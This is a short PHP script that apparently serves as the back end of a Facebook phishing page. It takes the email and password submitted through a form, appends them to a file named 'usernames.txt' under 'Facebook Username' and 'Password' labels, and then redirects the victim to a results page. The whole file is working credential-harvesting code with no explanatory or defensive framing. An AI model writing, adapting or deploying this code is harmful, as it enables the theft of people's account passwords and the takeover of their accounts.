<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
?>